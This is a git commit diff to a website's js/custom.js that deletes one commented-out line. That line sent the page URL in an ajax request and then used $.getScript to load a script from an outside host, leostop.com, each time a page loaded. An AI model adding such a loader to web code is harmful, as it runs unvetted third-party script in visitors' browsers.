c9ea537712a8eb21ff9562b700b747a91bb77970
clasa-a-5-a <97824142+clasa-a-5-a@users.noreply.github.com>
2022-03-12 19:41:41 +0200

    fara

--- js/custom.js
+++ js/custom.js
@@ -61,8 +61,6 @@ $(function () {
 
 });
 
-/*function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
-
 /* Toggle sidebar
      -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 function openNav() {
